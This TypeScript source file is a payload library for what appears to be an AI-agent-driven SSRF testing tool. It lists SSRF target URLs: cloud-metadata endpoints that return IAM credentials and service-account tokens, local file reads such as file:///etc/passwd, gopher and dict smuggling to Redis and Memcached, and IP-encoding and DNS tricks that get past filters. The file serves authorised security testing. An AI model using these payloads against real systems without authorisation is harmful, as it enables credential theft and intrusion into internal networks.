// SSRF target library (plan §05 ssrf_test). The mechanical breadth — internal
// hosts, cloud-metadata endpoints, IP-encoding bypasses, protocol smuggling — moved
// out of the ssrf agent's prompt into tool-owned data. The agent picks WHICH
// categories fit the endpoint and reasons over the oracle's findings; the tool
// supplies the payloads and (via ssrf_test) sends them. Detection-only targets:
// benign reads of well-known internal endpoints, no write/smuggle-to-exploit here.

export type SsrfCategory = "localhost" | "cloud_metadata" | "internal_range" | "ip_bypass" | "protocol" | "dns_bypass"

export type CloudProvider = "aws" | "gcp" | "azure" | "digitalocean" | "oracle" | "alibaba"

export interface SsrfTarget {
  value: string // the URL/host to place in the vulnerable parameter
  category: SsrfCategory
  provider?: CloudProvider
  // Headers some metadata services REQUIRE (GCP: Metadata-Flavor; Azure: Metadata).
  headers?: Record<string, string>
  note: string
}

export namespace SsrfPayloads {
  // Loopback in many notations — beats naive "127.0.0.1"/"localhost" denylists.
  const LOCALHOST: SsrfTarget[] = [
    { value: "http://127.0.0.1/", category: "localhost", note: "loopback" },
    { value: "http://localhost/", category: "localhost", note: "loopback name" },
    { value: "http://0.0.0.0/", category: "localhost", note: "all-interfaces" },
    { value: "http://[::1]/", category: "localhost", note: "IPv6 loopback" },
    { value: "http://127.1/", category: "localhost", note: "short-form loopback" },
  ]

  // Cloud instance-metadata services — the crown-jewel SSRF target (IAM creds).
  const CLOUD_METADATA: SsrfTarget[] = [
    { value: "http://169.254.169.254/latest/meta-data/", category: "cloud_metadata", provider: "aws", note: "AWS IMDS root" },
    {
      value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      category: "cloud_metadata",
      provider: "aws",
      note: "AWS IAM role credentials (IMDSv1)",
    },
    {
      value: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      category: "cloud_metadata",
      provider: "gcp",
      headers: { "Metadata-Flavor": "Google" },
      note: "GCP service-account access token",
    },
    {
      value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      category: "cloud_metadata",
      provider: "azure",
      headers: { Metadata: "true" },
      note: "Azure IMDS instance metadata",
    },
    {
      value: "http://169.254.169.254/metadata/v1/",
      category: "cloud_metadata",
      provider: "digitalocean",
      note: "DigitalOcean metadata",
    },
    {
      value: "http://192.0.0.192/latest/meta-data/",
      category: "cloud_metadata",
      provider: "oracle",
      note: "Oracle Cloud metadata",
    },
    {
      value: "http://100.100.100.200/latest/meta-data/",
      category: "cloud_metadata",
      provider: "alibaba",
      note: "Alibaba Cloud metadata",
    },
  ]

  // RFC1918 + link-local — internal-network reachability probes.
  const INTERNAL_RANGE: SsrfTarget[] = [
    { value: "http://10.0.0.1/", category: "internal_range", note: "RFC1918 10/8" },
    { value: "http://172.16.0.1/", category: "internal_range", note: "RFC1918 172.16/12" },
    { value: "http://192.168.0.1/", category: "internal_range", note: "RFC1918 192.168/16" },
    { value: "http://169.254.169.254/", category: "internal_range", note: "link-local" },
  ]

  // Alternate encodings of 169.254.169.254 / 127.0.0.1 — beat string-match filters.
  const IP_BYPASS: SsrfTarget[] = [
    { value: "http://2130706433/", category: "ip_bypass", note: "127.0.0.1 as decimal" },
    { value: "http://0x7f000001/", category: "ip_bypass", note: "127.0.0.1 as hex" },
    { value: "http://0177.0.0.1/", category: "ip_bypass", note: "127.0.0.1 with octal octet" },
    { value: "http://2852039166/", category: "ip_bypass", note: "169.254.169.254 as decimal" },
    { value: "http://0xA9FEA9FE/", category: "ip_bypass", note: "169.254.169.254 as hex" },
    { value: "http://[::ffff:127.0.0.1]/", category: "ip_bypass", note: "IPv4-mapped IPv6 loopback" },
  ]

  // Non-HTTP schemes the fetcher may follow — file read + service smuggling.
  const PROTOCOL: SsrfTarget[] = [
    { value: "file:///etc/passwd", category: "protocol", note: "local file read (Unix)" },
    { value: "file:///c:/windows/win.ini", category: "protocol", note: "local file read (Windows)" },
    { value: "gopher://127.0.0.1:6379/_INFO%0d%0a", category: "protocol", note: "Redis via gopher smuggling" },
    { value: "dict://127.0.0.1:11211/stats", category: "protocol", note: "Memcached via dict" },
    { value: "ftp://127.0.0.1/", category: "protocol", note: "internal FTP" },
  ]

  // Hostnames that resolve to internal IPs, and parser-confusion hosts.
  const DNS_BYPASS: SsrfTarget[] = [
    { value: "http://127.0.0.1.nip.io/", category: "dns_bypass", note: "wildcard DNS → 127.0.0.1" },
    { value: "http://localtest.me/", category: "dns_bypass", note: "public host resolving to 127.0.0.1" },
    { value: "http://spoofed@169.254.169.254/", category: "dns_bypass", note: "userinfo @-confusion → metadata" },
    { value: "http://169.254.169.254#@allowed.example.com/", category: "dns_bypass", note: "fragment host-confusion" },
  ]

  export const TARGETS: readonly SsrfTarget[] = [
    ...LOCALHOST,
    ...CLOUD_METADATA,
    ...INTERNAL_RANGE,
    ...IP_BYPASS,
    ...PROTOCOL,
    ...DNS_BYPASS,
  ]

  /**
   * Pick targets. `categories` filters by category; `providers` further restricts
   * cloud_metadata to specific providers (drop others). `limit` caps the count.
   * No opts → all targets.
   */
  export function select(opts: { categories?: SsrfCategory[]; providers?: CloudProvider[]; limit?: number } = {}): SsrfTarget[] {
    let out = TARGETS.slice()
    if (opts.categories && opts.categories.length > 0) {
      const set = new Set(opts.categories)
      out = out.filter((t) => set.has(t.category))
    }
    if (opts.providers && opts.providers.length > 0) {
      const set = new Set(opts.providers)
      // Provider filter applies ONLY to cloud_metadata targets; others pass through.
      out = out.filter((t) => t.category !== "cloud_metadata" || (t.provider !== undefined && set.has(t.provider)))
    }
    if (opts.limit !== undefined && opts.limit >= 0) out = out.slice(0, opts.limit)
    return out
  }
}
